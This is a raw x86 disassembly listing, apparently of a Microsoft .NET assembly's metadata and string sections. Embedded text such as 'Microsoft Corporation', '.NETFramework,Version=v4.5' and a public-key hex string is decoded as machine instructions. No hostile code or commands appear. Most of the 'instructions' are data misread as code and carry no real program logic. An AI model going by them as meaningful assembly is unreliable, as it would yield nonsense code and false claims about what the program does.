  4034a8:	jb     0x403513
  4034aa:	bound  esi,QWORD PTR [ebp+0x74]
  4034ad:	add    BYTE PTR gs:[edx+0x65],dl
  4034b1:	data16 gs jb 0x40351a
  4034b5:	outs   dx,BYTE PTR ds:[esi]
  4034b6:	arpl   WORD PTR [ebp+0x45],sp
  4034b9:	jno    0x403530
  4034bb:	popa   
  4034bc:	ins    BYTE PTR es:[edi],dx
  4034bd:	jae    0x4034bf
  4034bf:	push   esp
  4034c0:	jns    0x403532
  4034c2:	add    BYTE PTR gs:[edx+0x75],dl
  4034c6:	outs   dx,BYTE PTR ds:[esi]
  4034c7:	je     0x403532
  4034c9:	ins    DWORD PTR es:[edi],dx
  4034ca:	gs push esp
  4034cc:	jns    0x40353e
  4034ce:	gs dec eax
  4034d0:	popa   
  4034d1:	outs   dx,BYTE PTR ds:[esi]
  4034d2:	fs ins BYTE PTR es:[edi],dx
  4034d4:	add    BYTE PTR gs:[edi+0x65],al
  4034d8:	je     0x40352e
  4034da:	jns    0x40354c
  4034dc:	gs inc esi
  4034de:	jb     0x40354f
  4034e0:	ins    DWORD PTR es:[edi],dx
  4034e1:	dec    eax
  4034e2:	popa   
  4034e3:	outs   dx,BYTE PTR ds:[esi]
  4034e4:	fs ins BYTE PTR es:[edi],dx
  4034e6:	add    BYTE PTR gs:[ecx+0x73],al
  4034ea:	jae    0x403551
  4034ec:	ins    DWORD PTR es:[edi],dx
  4034ed:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  4034f1:	addr16 gs je 0x403554
  4034f5:	inc    ecx
  4034f6:	jae    0x40356b
  4034f8:	gs ins DWORD PTR es:[edi],dx
  4034fa:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  4034fe:	inc    edi
  4034ff:	gs je  0x403555
  403502:	je     0x403576
  403504:	imul   ebp,DWORD PTR [esi+0x67],0x73795300
  40350b:	je     0x403572
  40350d:	ins    DWORD PTR es:[edi],dx
  40350e:	cs inc ebx
  403510:	outs   dx,DWORD PTR ds:[esi]
  403511:	ins    DWORD PTR es:[edi],dx
  403512:	jo     0x403583
  403514:	outs   dx,BYTE PTR ds:[esi]
  403515:	outs   dx,BYTE PTR gs:[esi]
  403517:	je     0x403566
  403519:	outs   dx,DWORD PTR ds:[esi]
  40351a:	fs gs ins BYTE PTR es:[edi],dx
  40351d:	add    BYTE PTR [ebp+0x64],al
  403520:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x776f7242
  403528:	jae    0x40358b
  40352a:	bound  ebp,QWORD PTR [ebp+eiz*2+0x41]
  40352e:	je     0x4035a4
  403530:	jb     0x40359b
  403532:	bound  esi,QWORD PTR [ebp+0x74]
  403535:	add    BYTE PTR gs:[ebp+0x64],al
  403539:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x776f7242
  403541:	jae    0x4035a4
  403543:	bound  ebp,QWORD PTR [ebp+eiz*2+0x53]
  403547:	je     0x4035aa
  403549:	je     0x4035b0
  40354b:	add    BYTE PTR [ebp+0x69],cl
  40354e:	arpl   WORD PTR [edx+0x6f],si
  403551:	jae    0x4035c2
  403553:	data16 je 0x403584
  403556:	push   esi
  403557:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  40355e:	jne    0x4035c4
  403560:	imul   ebp,DWORD PTR [edi+0x2e],0x65746e49
  403567:	ins    BYTE PTR es:[edi],dx
  403568:	ins    BYTE PTR es:[edi],dx
  403569:	imul   edx,DWORD PTR [edx+esi*2+0x61],0x542e6563
  403571:	outs   dx,DWORD PTR ds:[esi]
  403572:	outs   dx,DWORD PTR ds:[esi]
  403573:	ins    BYTE PTR es:[edi],dx
  403574:	jae    0x4035a4
  403576:	push   edx
  403577:	gs jae 0x4035e9
  40357a:	jne    0x4035ee
  40357c:	arpl   WORD PTR [ebp+0x73],sp
  40357f:	cs jb  0x4035e7
  403582:	jae    0x4035f3
  403584:	jne    0x4035f8
  403586:	arpl   WORD PTR [ebp+0x73],sp
  403589:	add    BYTE PTR [eax],al
  40358b:	add    BYTE PTR [eax],al
  40358d:	cmp    ebp,DWORD PTR [eax]
  40358f:	add    BYTE PTR [edx],ah
  403591:	add    BYTE PTR [ebx+0x0],bl
  403594:	pop    esi
  403595:	add    BYTE PTR [edx],ah
  403597:	add    BYTE PTR [ebp+0x0],bl
  40359a:	sub    eax,DWORD PTR [eax]
  40359c:	and    al,BYTE PTR [eax]
  40359e:	sub    DWORD PTR [eax],eax
  4035a0:	and    BYTE PTR [eax],al
  4035a2:	sub    BYTE PTR [eax],al
  4035a4:	and    al,BYTE PTR [eax]
  4035a6:	pop    ebx
  4035a7:	add    BYTE PTR [esi+0x0],bl
  4035aa:	and    al,BYTE PTR [eax]
  4035ac:	pop    ebp
  4035ad:	add    BYTE PTR [ebx],ch
  4035af:	add    BYTE PTR [edx],ah
  4035b1:	add    BYTE PTR [ecx],ch
  4035b3:	add    BYTE PTR [eax],ah
  4035b5:	add    BYTE PTR [eax],ch
  4035b7:	add    BYTE PTR [edx],ah
  4035b9:	add    BYTE PTR [ebx+0x0],bl
  4035bc:	pop    esi
  4035bd:	add    BYTE PTR [edx],ah
  4035bf:	add    BYTE PTR [ebp+0x0],bl
  4035c2:	sub    eax,DWORD PTR [eax]
  4035c4:	and    al,BYTE PTR [eax]
  4035c6:	sub    DWORD PTR [eax],eax
  4035c8:	add    BYTE PTR [edi+0x4d],ah
  4035cb:	add    BYTE PTR [ecx+0x0],ch
  4035ce:	arpl   WORD PTR [eax],ax
  4035d0:	jb     0x4035d2
  4035d2:	outs   dx,DWORD PTR ds:[esi]
  4035d3:	add    BYTE PTR [ebx+0x0],dh
  4035d6:	outs   dx,DWORD PTR ds:[esi]
  4035d7:	add    BYTE PTR [esi+0x0],ah
  4035da:	je     0x4035dc
  4035dc:	add    BYTE PTR cs:[esi+0x0],dl
  4035e0:	imul   eax,DWORD PTR [eax],0x750073
  4035e6:	popa   
  4035e7:	add    BYTE PTR [eax+eax*1+0x53],ch
  4035eb:	add    BYTE PTR [eax+eax*1+0x75],dh
  4035ef:	add    BYTE PTR [eax+eax*1+0x69],ah
  4035f3:	add    BYTE PTR [edi+0x0],ch
  4035f6:	add    BYTE PTR cs:[ecx+0x0],cl
  4035fa:	outs   dx,BYTE PTR ds:[esi]
  4035fb:	add    BYTE PTR [eax+eax*1+0x65],dh
  4035ff:	add    BYTE PTR [eax+eax*1+0x6c],ch
  403603:	add    BYTE PTR [ecx+0x0],ch
  403606:	push   esp
  403607:	add    BYTE PTR [edx+0x0],dh
  40360a:	popa   
  40360b:	add    BYTE PTR [ebx+0x0],ah
  40360e:	add    BYTE PTR gs:[esi],ch
  403611:	add    BYTE PTR [eax+eax*1+0x6f],dl
  403615:	add    BYTE PTR [edi+0x0],ch
  403618:	ins    BYTE PTR es:[edi],dx
  403619:	add    BYTE PTR [ebx+0x0],dh
  40361c:	add    BYTE PTR cs:[edx+0x0],dl
  403620:	add    BYTE PTR gs:[ebx+0x0],dh
  403624:	outs   dx,DWORD PTR ds:[esi]
  403625:	add    BYTE PTR [ebp+0x0],dh
  403628:	jb     0x40362a
  40362a:	arpl   WORD PTR [eax],ax
  40362c:	add    BYTE PTR gs:[ebx+0x0],dh
  403630:	add    BYTE PTR [edi],bl
  403632:	inc    ebp
  403633:	add    BYTE PTR [edx+0x0],dh
  403636:	jb     0x403638
  403638:	outs   dx,DWORD PTR ds:[esi]
  403639:	add    BYTE PTR [edx+0x0],dh
  40363c:	pop    edi
  40363d:	add    BYTE PTR [ebp+0x0],al
  403640:	js     0x403642
  403642:	arpl   WORD PTR [eax],ax
  403644:	add    BYTE PTR gs:[eax+0x0],dh
  403648:	je     0x40364a
  40364a:	imul   eax,DWORD PTR [eax],0x6e006f
  403650:	add    BYTE PTR [edi],ah
  403652:	inc    ebp
  403653:	add    BYTE PTR [edx+0x0],dh
  403656:	jb     0x403658
  403658:	outs   dx,DWORD PTR ds:[esi]
  403659:	add    BYTE PTR [edx+0x0],dh
  40365c:	pop    edi
  40365d:	add    BYTE PTR [ecx+0x0],cl
  403660:	dec    ecx
  403661:	add    BYTE PTR [ebx+0x0],dl
  403664:	dec    esi
  403665:	add    BYTE PTR [edi+0x0],ch
  403668:	je     0x40366a
  40366a:	push   eax
  40366b:	add    BYTE PTR [edx+0x0],dh
  40366e:	add    BYTE PTR gs:[ebx+0x0],dh
  403672:	add    BYTE PTR gs:[esi+0x0],ch
  403676:	je     0x403678
  403678:	add    BYTE PTR [edi],dl
  40367a:	inc    ebp
  40367b:	add    BYTE PTR [edx+0x0],dh
  40367e:	jb     0x403680
  403680:	outs   dx,DWORD PTR ds:[esi]
  403681:	add    BYTE PTR [edx+0x0],dh
  403684:	pop    edi
  403685:	add    BYTE PTR [ebp+0x0],dl
  403688:	jae    0x40368a
  40368a:	popa   
  40368b:	add    BYTE PTR [edi+0x0],ah
  40368e:	add    BYTE PTR gs:[eax],al
  403691:	daa    
  403692:	inc    ebp
  403693:	add    BYTE PTR [esi+0x0],dh
  403696:	add    BYTE PTR gs:[esi+0x0],ch
  40369a:	je     0x40369c
  40369c:	dec    esp
  40369d:	add    BYTE PTR [edi+0x0],ch
  4036a0:	add    BYTE PTR [bx+0x0],bl
  4036a4:	push   ebx
  4036a5:	add    BYTE PTR [edi+0x0],ch
  4036a8:	jne    0x4036aa
  4036aa:	jb     0x4036ac
  4036ac:	arpl   WORD PTR [eax],ax
  4036ae:	add    BYTE PTR gs:[esi+0x0],cl
  4036b2:	popa   
  4036b3:	add    BYTE PTR [ebp+0x0],ch
  4036b6:	add    BYTE PTR gs:[eax],al
  4036b9:	add    BYTE PTR [eax],al
  4036bb:	add    BYTE PTR [edi-0x71],ch
  4036be:	or     BYTE PTR [ebx+0x4177dd4f],cl
  4036c4:	xor    DWORD PTR [esi+0x13],0xffffff82
  4036c8:	jbe    0x40364d
  4036ca:	fidivr DWORD PTR [eax+0x0]
  4036cd:	or     BYTE PTR [edi+0x19565c7a],dh
  4036d3:	xor    al,0xe0
  4036d5:	mov    DWORD PTR [ebx],eax
  4036d7:	push   es
  4036d8:	adc    cl,BYTE PTR [ecx]
  4036da:	add    eax,DWORD PTR [eax]
  4036dc:	add    BYTE PTR [ecx],al
  4036de:	add    al,0x0
  4036e0:	add    DWORD PTR [ecx],eax
  4036e2:	push   cs
  4036e3:	add    eax,DWORD PTR [esi]
  4036e5:	adc    cl,BYTE PTR ds:0x11120603
  4036eb:	add    esp,DWORD PTR [eax]
  4036ed:	add    BYTE PTR [ecx],al
  4036ef:	add    al,0x0
  4036f1:	add    BYTE PTR [edx],dl
  4036f3:	or     eax,0x12000004
  4036f8:	adc    DWORD PTR ds:0x12010100,eax
  4036fe:	adc    DWORD PTR [ebx],eax
  403700:	add    BYTE PTR [eax],al
  403702:	push   cs
  403703:	add    al,0x8
  403705:	add    BYTE PTR [edx],dl
  403707:	or     eax,0x12000804
  40370c:	adc    DWORD PTR [ebx],eax
  40370e:	or     BYTE PTR [eax],al
  403710:	push   cs
  403711:	add    al,0x20
  403713:	add    DWORD PTR [ecx],eax
  403715:	push   cs
  403716:	add    al,0x20
  403718:	add    DWORD PTR [ecx],eax
  40371a:	add    al,BYTE PTR ds:0xe010220
  403720:	push   cs
  403721:	add    eax,0x11010120
  403726:	popa   
  403727:	add    al,0x20
  403729:	add    DWORD PTR [ecx],eax
  40372b:	or     BYTE PTR [eax+0x2400a0],al
  403731:	add    BYTE PTR [eax+eax*4],al
  403734:	add    BYTE PTR [eax],al
  403736:	xchg   esp,eax
  403737:	add    BYTE PTR [eax],al
  403739:	add    BYTE PTR [esi],al
  40373b:	add    al,BYTE PTR [eax]
  40373d:	add    BYTE PTR [eax],al
  40373f:	and    al,0x0
  403741:	add    BYTE PTR [edx+0x53],dl
  403744:	inc    ecx
  403745:	xor    DWORD PTR [eax],eax
  403747:	add    al,0x0
  403749:	add    BYTE PTR [ecx],al
  40374b:	add    BYTE PTR [ecx],al
  40374d:	add    BYTE PTR [edi],al
  40374f:	sar    edx,1
  403751:	push   edi
  403752:	les    ebp,FWORD PTR [esi+0x2ea3f0d9]
  403758:	test   BYTE PTR [edx+0xdfdae0f],ch
  40375e:	jmp    0xecab354b
  403763:	pop    DWORD PTR [edi+0x6c7603fb]
  403769:	or     DWORD PTR [ecx+ebx*4-0x6e],0x1e
  40376e:	mov    dl,0x3b
  403770:	out    0x9a,eax
  403772:	(bad)  
  403774:	fadd   st(1),st
  403776:	fstp   QWORD PTR [edx+0x211336d2]
  40377c:	add    dl,BYTE PTR [eax-0x6c38df5]
  403782:	adc    BYTE PTR [ebp+0x77e1c47f],0x10
  403789:	pop    esi
  40378b:	pop    es
  40378c:	ja     0x4037dd
  40378e:	sub    eax,ebp
  403790:	xor    cl,BYTE PTR [esi]
  403792:	xchg   edx,eax
  403793:	jmp    0xc021:0xe8e4ec05
  40379a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40379b:	out    dx,eax
  40379c:	call   0x4c9c9c92
  4037a1:	or     al,0x93
  4037a3:	shr    DWORD PTR [ebx+0x625d2899],0x2c
  4037aa:	stos   BYTE PTR es:[edi],al
  4037ab:	gs sub al,0x1d
  4037ae:	cli    
  4037af:	(bad)  
  4037b0:	cmp    eax,0x2d6f5d74
  4037b5:	in     eax,0xf1
  4037b7:	jle    0x403817
  4037b9:	scas   eax,DWORD PTR es:[edi]
  4037ba:	pinsrw mm2,WORD PTR [esi-0x75e3d9c3],0x12
  4037c2:	inc    ebx
  4037c3:	sbb    BYTE PTR gs:[eax],ah
  4037c6:	ins    DWORD PTR es:[edi],dx
  4037c7:	rcl    BYTE PTR [ebx-0x2da5b2cc],0x93
  4037ce:	push   es
  4037cf:	add    BYTE PTR [edx],al
  4037d1:	adc    dh,BYTE PTR [ecx+0xe]
  4037d4:	push   cs
  4037d5:	add    esp,DWORD PTR [eax]
  4037d7:	add    BYTE PTR [edx],al
  4037d9:	add    al,0x20
  4037db:	add    BYTE PTR [edx],dl
  4037dd:	jns    0x4037e2
  4037df:	and    BYTE PTR [eax],al
  4037e1:	or     BYTE PTR ds:0x75120120,al
  4037e7:	or     BYTE PTR [ebx],al
  4037e9:	and    BYTE PTR [eax],al
  4037eb:	push   cs
  4037ec:	add    eax,0x1d0e0120
  4037f1:	add    ecx,DWORD PTR [eax]
  4037f3:	mov    al,0x3f
  4037f5:	pop    edi
  4037f6:	jg     0x403809
  4037f8:	aad    0xa
  4037fa:	cmp    al,BYTE PTR ds:0x80110000
  403800:	lea    eax,[esi]
  403802:	add    BYTE PTR [edx],al
  403804:	push   cs
  403805:	push   cs
  403806:	sbb    eax,0x31c
  40380b:	or     BYTE PTR ds:0x80120000,al
  403811:	xchg   ebp,eax
  403812:	or     BYTE PTR [eax],al
  403814:	add    DWORD PTR [edx],edx
  403816:	sbb    BYTE PTR [ebp+0x49d8012],0x0
  40381d:	add    DWORD PTR [esi],ecx
  40381f:	push   cs
  403820:	add    eax,0xe0e0220
  403825:	push   cs
  403826:	push   es
  403827:	and    BYTE PTR [ecx],al
  403829:	add    DWORD PTR [edx],edx
  40382b:	sbb    BYTE PTR [ebp+0x12002005],0x80
  403832:	mov    ch,0x7
  403834:	add    BYTE PTR [ecx],al
  403836:	or     BYTE PTR ds:0x5b18012,bl
  40383c:	and    BYTE PTR [eax],al
  40383e:	adc    al,BYTE PTR [eax+0xe0721c1]
  403844:	adc    dh,BYTE PTR [ecx+0xe]
  403847:	push   cs
  403848:	or     BYTE PTR [edx],dl
  40384a:	sub    BYTE PTR [ebp+0x12a98012],0x80
  403851:	xchg   ebp,eax
  403852:	push   cs
  403853:	adc    al,BYTE PTR [eax-0x3a7fed5f]
  403859:	sbb    eax,0x1d031d03
  40385e:	adc    al,BYTE PTR [eax+0x21c1db1]
  403864:	push   es
  403865:	push   cs
  403866:	pop    es
  403867:	and    BYTE PTR [edx],al
  403869:	add    DWORD PTR [esi],ecx
  40386b:	adc    DWORD PTR [eax+0x140c9],eax
  403871:	xor    edx,DWORD PTR [ebx+0x79]
  403874:	jae    0x4038ea
  403876:	gs ins DWORD PTR es:[edi],dx
  403878:	cs push edx
  40387a:	gs jae 0x4038ec
  40387d:	jne    0x4038f1
  40387f:	arpl   WORD PTR [ebp+0x73],sp
  403882:	cs push esp
  403884:	outs   dx,DWORD PTR ds:[esi]
  403885:	outs   dx,DWORD PTR ds:[esi]
  403886:	ins    BYTE PTR es:[edi],dx
  403887:	jae    0x4038b7
  403889:	push   ebx
  40388a:	je     0x4038fe
  40388c:	outs   dx,DWORD PTR ds:[esi]
  40388d:	outs   dx,BYTE PTR ds:[esi]
  40388e:	ins    BYTE PTR es:[di],dx
  403890:	jns    0x4038e6
  403892:	jns    0x403904
  403894:	gs fs push edx
  403897:	gs jae 0x403909
  40389a:	jne    0x40390e
  40389c:	arpl   WORD PTR [ebp+0x42],sp
  40389f:	jne    0x40390a
  4038a1:	ins    BYTE PTR es:[edi],dx
  4038a2:	fs gs jb 0x4038ad
  4038a6:	xor    al,0x2e
  4038a8:	xor    BYTE PTR [esi],ch
  4038aa:	xor    BYTE PTR [esi],ch
  4038ac:	xor    BYTE PTR [eax],al
  4038ae:	add    BYTE PTR [ecx+eax*1],al
  4038b1:	add    BYTE PTR [eax],al
  4038b3:	add    BYTE PTR ds:0x1c020200,al
  4038b9:	sbb    al,0x8
  4038bb:	add    BYTE PTR [ecx],al
  4038bd:	adc    al,BYTE PTR [eax-0x1e7fee23]
  4038c3:	add    eax,0x80120020
  4038c8:	in     eax,0x7
  4038ca:	and    BYTE PTR [edx],al
  4038cc:	add    DWORD PTR [esi],ecx
  4038ce:	adc    al,BYTE PTR [eax+0x10704e5]
  4038d4:	adc    cl,BYTE PTR ds:0xe022006
  4038da:	push   cs
  4038db:	adc    dl,BYTE PTR [ecx]
  4038dd:	push   es
  4038de:	and    BYTE PTR [ecx],al
  4038e0:	add    DWORD PTR [ecx],edx
  4038e2:	sub    ch,0x8
  4038e5:	add    DWORD PTR [eax],eax
  4038e7:	add    al,BYTE PTR [eax]
  4038e9:	add    BYTE PTR [eax],al
  4038eb:	add    BYTE PTR [eax],al
  4038ed:	aaa    
  4038ee:	add    DWORD PTR [eax],eax
  4038f0:	sbb    ch,BYTE PTR [esi]
  4038f2:	dec    esi
  4038f3:	inc    ebp
  4038f4:	push   esp
  4038f5:	inc    esi
  4038f6:	jb     0x403959
  4038f8:	ins    DWORD PTR es:[edi],dx
  4038f9:	gs ja  0x40396b
  4038fc:	jb     0x403969
  4038fe:	sub    al,0x56
  403900:	gs jb  0x403976
  403903:	imul   ebp,DWORD PTR [edi+0x6e],0x2e34763d
  40390a:	xor    eax,0xe540001
  40390f:	adc    al,0x46
  403911:	jb     0x403974
  403913:	ins    DWORD PTR es:[edi],dx
  403914:	gs ja  0x403986
  403917:	jb     0x403984
  403919:	inc    esp
  40391a:	imul   esi,DWORD PTR [ebx+0x70],0x4e79616c
  403921:	popa   
  403922:	ins    DWORD PTR es:[edi],dx
  403923:	add    BYTE PTR gs:0x1,al
  40392a:	add    BYTE PTR ds:0x10001,al
  403930:	add    BYTE PTR ds:0x54100001,dl
  403936:	inc    esp
  403937:	inc    ebp
  403938:	outs   dx,BYTE PTR ds:[esi]
  403939:	jbe    0x40397e
  40393b:	ins    BYTE PTR es:[edi],dx
  40393c:	gs popa 
  40393e:	outs   dx,BYTE PTR ds:[esi]
  40393f:	jne    0x4039b1
  403941:	cs gs js 0x4039aa
  403945:	add    BYTE PTR [eax],al
  403947:	sbb    al,BYTE PTR [ecx]
  403949:	add    BYTE PTR ds:0x7263694d,dl
  40394f:	outs   dx,DWORD PTR ds:[esi]
  403950:	jae    0x4039c1
  403952:	data16 je 0x403975
  403955:	inc    ebx
  403956:	outs   dx,DWORD PTR ds:[esi]
  403957:	jb     0x4039c9
  403959:	outs   dx,DWORD PTR ds:[esi]
  40395a:	jb     0x4039bd
  40395c:	je     0x4039c7
  40395e:	outs   dx,DWORD PTR ds:[esi]
  40395f:	outs   dx,BYTE PTR ds:[esi]
  403960:	add    BYTE PTR [eax],al
  403962:	and    eax,0x4d200001
  403967:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  40396e:	je     0x403932
  403970:	scas   al,BYTE PTR es:[edi]
  403971:	and    BYTE PTR [esi+0x69],dl
  403974:	jae    0x4039eb
  403976:	popa   
  403977:	ins    BYTE PTR es:[edi],dx
  403978:	and    BYTE PTR [ebx+0x74],dl
  40397b:	jne    0x4039e1
  40397d:	imul   ebp,DWORD PTR [edi-0x3e],0x303220ae
  403984:	xor    DWORD PTR [edx],esi
  403986:	add    BYTE PTR [eax],al
  403988:	xor    eax,DWORD PTR [ecx]
  40398a:	add    BYTE PTR [esi],ch
  40398c:	ret    0x20a9
  40398f:	dec    ebp
  403990:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  403997:	je     0x4039b9
  403999:	inc    ebx
  40399a:	outs   dx,DWORD PTR ds:[esi]
  40399b:	jb     0x403a0d
  40399d:	outs   dx,DWORD PTR ds:[esi]
  40399e:	jb     0x403a01
  4039a0:	je     0x403a0b
  4039a2:	outs   dx,DWORD PTR ds:[esi]
  4039a3:	outs   dx,BYTE PTR ds:[esi]
  4039a4:	and    BYTE PTR cs:[ecx+0x6c],al
  4039a8:	ins    BYTE PTR es:[edi],dx
  4039a9:	and    BYTE PTR [edx+0x69],dh
  4039ac:	addr16 push 0x72207374
  4039b2:	gs jae 0x403a1a
  4039b5:	jb     0x403a2d
  4039b7:	gs fs add BYTE PTR cs:[eax],al
  4039bc:	adc    DWORD PTR [ecx],eax
  4039be:	add    BYTE PTR [ecx+esi*1],cl
  4039c1:	xor    DWORD PTR [esi],ebp
  4039c3:	xor    BYTE PTR [esi],ch
  4039c5:	xor    eax,0x37323730
  4039ca:	xor    DWORD PTR cs:[eax],eax
  4039cd:	add    BYTE PTR ds:0x31080001,cl
  4039d3:	xor    DWORD PTR [esi],ebp
  4039d5:	xor    BYTE PTR [esi],ch
  4039d7:	xor    BYTE PTR [esi],ch
  4039d9:	xor    BYTE PTR [eax],al
  4039db:	add    BYTE PTR [edx],cl
  4039dd:	add    DWORD PTR [eax],eax
  4039df:	add    eax,0x552d6e65
  4039e4:	push   ebx
  4039e5:	add    BYTE PTR [eax],al
  4039e7:	sub    al,BYTE PTR [ecx]
  4039e9:	add    BYTE PTR ds:0x645c3a46,ah
  4039ef:	fs pop esp
  4039f1:	je     0x403a62
  4039f3:	outs   dx,DWORD PTR ds:[esi]
  4039f4:	ins    BYTE PTR es:[edi],dx
  4039f5:	jae    0x403a53
  4039f7:	fs gs jbe 0x403a5f
  4039fb:	imul   esi,DWORD PTR [esi+0x5c],0x616e6946
  403a02:	ins    BYTE PTR es:[edi],dx
  403a03:	push   eax
  403a04:	jne    0x403a68
  403a06:	ins    BYTE PTR es:[edi],dx
  403a07:	imul   esp,DWORD PTR [ebx+0x4b],0x732e7965
  403a0e:	outs   dx,BYTE PTR ds:[esi]
  403a0f:	imul   eax,DWORD PTR [eax],0x0
  403a12:	or     DWORD PTR [eax+0x1],0x0
  403a16:	add    BYTE PTR [eax+0x30],0x30
  403a1a:	xor    dh,BYTE PTR [eax+esi*1]
  403a1d:	xor    BYTE PTR [eax],dh
  403a1f:	xor    BYTE PTR [eax],dh
  403a21:	arpl   WORD PTR [eax],di
  403a23:	xor    BYTE PTR [eax],dh
  403a25:	xor    BYTE PTR [eax],dh
  403a27:	xor    BYTE PTR [ecx],dh
  403a29:	xor    al,0x30
  403a2b:	xor    DWORD PTR [eax],esi
  403a2d:	xor    BYTE PTR [eax],dh
  403a2f:	xor    BYTE PTR [eax],dh
  403a31:	xor    BYTE PTR ss:[edx],dh
  403a34:	xor    BYTE PTR [eax],dh
  403a36:	xor    BYTE PTR [eax],dh
  403a38:	xor    BYTE PTR [eax],dh
  403a3a:	xor    dh,BYTE PTR [eax+esi*1]
  403a3d:	xor    BYTE PTR [eax],dh
  403a3f:	xor    BYTE PTR ds:0x34333532,dh
  403a45:	xor    DWORD PTR [ebx],esi
  403a47:	xor    DWORD PTR [eax],esi
  403a49:	xor    BYTE PTR [eax],dh
  403a4b:	cmp    BYTE PTR [eax],dh
  403a4d:	xor    BYTE PTR [eax],dh
  403a4f:	xor    BYTE PTR [eax],dh
  403a51:	xor    DWORD PTR [eax],esi
  403a53:	xor    BYTE PTR [eax],dh
  403a55:	xor    DWORD PTR [eax],esi
  403a57:	xor    BYTE PTR [esi],dh
  403a59:	xor    DWORD PTR [ebx],esi
  403a5b:	xor    edi,DWORD PTR [ecx]
  403a5d:	cmp    DWORD PTR [ecx+0x66],esp
  403a60:	xor    WORD PTR [eax],di
  403a63:	xor    WORD PTR gs:[ecx+0x32],sp
  403a68:	arpl   WORD PTR [edx],si
  403a6a:	xor    eax,0x32613431
  403a6f:	aaa    
  403a70:	xor    esp,DWORD PTR [ecx+0x34]
  403a73:	xor    ah,BYTE PTR [ecx+edi*1+0x30]
  403a77:	xor    al,0x32
  403a79:	bound  esi,QWORD PTR [edi]
  403a7b:	xor    dh,BYTE PTR [ebx]
  403a7d:	xor    dh,BYTE PTR [ecx]
  403a7f:	xor    WORD PTR [edi],si
  403a82:	xor    eax,0x32303137
  403a87:	cmp    WORD PTR fs:[ebp+0x62],sp
  403a8c:	popa   
  403a8d:	fs popa 
  403a8f:	cmp    DWORD PTR ss:[ecx],edi
  403a92:	xor    dh,BYTE PTR [ebx]
  403a94:	xor    dh,BYTE PTR gs:[edi]
  403a97:	xor    edi,DWORD PTR [eax]
  403a99:	xor    al,0x30
  403a9b:	arpl   WORD PTR ss:[edx],si
  403a9e:	xor    DWORD PTR [ebp+0x35],esp
  403aa1:	bound  edi,QWORD PTR [eax]
  403aa3:	xor    BYTE PTR [ecx],dh
  403aa5:	xor    eax,0x62613235
  403aaa:	cmp    BYTE PTR [edx+esi*1+0x30],ah
  403aae:	xor    BYTE PTR [ecx+0x36],ah
  403ab1:	xor    eax,0x35333261
  403ab6:	xor    BYTE PTR gs:[eax],dh
  403ab9:	xor    DWORD PTR [ecx+0x63],esp
  403abc:	cmp    DWORD PTR [ecx+0x64],esp
  403abf:	arpl   WORD PTR [edx],si
  403ac1:	xor    eax,0x38643266
  403ac6:	xor    DWORD PTR [ecx],esi
  403ac8:	bound  esi,QWORD PTR gs:[eax]
  403acb:	cmp    DWORD PTR [ecx+edi*1],esi
  403ace:	ss popa 
  403ad0:	xor    al,0x63
  403ad2:	ss popa 
  403ad4:	xor    eax,0x36346439
  403ad9:	xor    DWORD PTR [ecx],edi
  403adb:	xor    eax,0x36633938
  403ae0:	cmp    DWORD PTR [esi+0x35],esp
  403ae3:	bound  esp,QWORD PTR [ecx+0x66]
  403ae6:	xor    BYTE PTR [ebx+0x34],ah
  403ae9:	xor    DWORD PTR [edi],esi
  403aeb:	cmp    DWORD PTR [ecx+0x34],esp
  403aee:	aaa    
  403aef:	xor    esi,DWORD PTR [ecx]
  403af1:	xor    DWORD PTR [ecx+edi*1+0x32],esp
  403af5:	xor    eax,0x64633535
  403afa:	xor    BYTE PTR [eax],dh
  403afc:	ss popa 
  403afe:	arpl   WORD PTR [ebx+0x38],sp
  403b01:	bound  esi,QWORD PTR ds:0x66393539
  403b07:	xor    ah,BYTE PTR [edx+0x64]
  403b0a:	ss xor DWORD PTR gs:[eax],esi
  403b0e:	xor    esi,DWORD PTR gs:[esi]
  403b11:	xor    BYTE PTR [ebx+0x33],ah
  403b14:	xor    al,0x35
  403b16:	xor    esi,DWORD PTR [edi]
  403b18:	popa   
  403b19:	xor    DWORD PTR [edx+esi*1+0x36],esp
  403b1d:	ss fs popa 
  403b20:	cmp    BYTE PTR [eax],dh
  403b22:	cmp    BYTE PTR ds:0x35363538,dh
  403b28:	cmp    BYTE PTR [ebx],dh
  403b2a:	arpl   WORD PTR [eax],di
  403b2c:	xor    eax,0x64313864
  403b31:	popa   
  403b32:	aaa    
  403b33:	xor    sp,WORD PTR [ebp+0x63]
  403b37:	xor    BYTE PTR [ecx],dh
  403b39:	gs cmp DWORD PTR fs:0x35633436,esi
  403b41:	cmp    BYTE PTR [ecx+edi*1+0x33],ah
  403b45:	fs aaa 
  403b47:	xor    DWORD PTR [ebx],esi
  403b49:	arpl   WORD PTR [eax+esi*1+0x31],sp
  403b4d:	aaa    
  403b4e:	xor    ah,BYTE PTR [ebx+0x38]
  403b51:	xor    dh,BYTE PTR gs:[ebx]
  403b54:	popa   
  403b55:	xor    DWORD PTR [eax],esi
  403b57:	data16 xor BYTE PTR [edx],dh
  403b5a:	xor    edi,DWORD PTR [ecx]
  403b5c:	bound  edi,QWORD PTR [eax]
  403b5e:	xor    BYTE PTR [ebx+0x39],ah
  403b61:	bound  esi,QWORD PTR ss:[eax]
  403b64:	aaa    
  403b65:	aaa    
  403b66:	xor    esi,DWORD PTR [esi]
  403b68:	xor    ax,0x3864
  403b6c:	bound  esi,QWORD PTR [eax]
  403b6e:	xor    dh,BYTE PTR [edx]
  403b70:	xor    eax,0x34613234
  403b75:	gs aaa 
  403b77:	xor    al,0x32
  403b79:	xor    eax,0x66356131
  403b7e:	xor    al,0x33
  403b80:	xor    bh,BYTE PTR [eax]
  403b82:	xor    dh,BYTE PTR [ebx+esi*1]
  403b85:	xor    DWORD PTR [eax],edi
  403b87:	bound  esi,QWORD PTR [ebx]
  403b89:	xor    eax,0x35613933
  403b8e:	popa   
  403b8f:	xor    BYTE PTR [eax],bh
  403b91:	aaa    
  403b92:	data16 cmp BYTE PTR [ebp+0x35],ah
  403b96:	xor    esp,DWORD PTR [edx+esi*1+0x66]
  403b9a:	xor    DWORD PTR [ebx],esi
  403b9c:	xor    eax,0x61633966
  403ba1:	xor    al,0x37
  403ba3:	xor    sp,WORD PTR [edx+0x62]
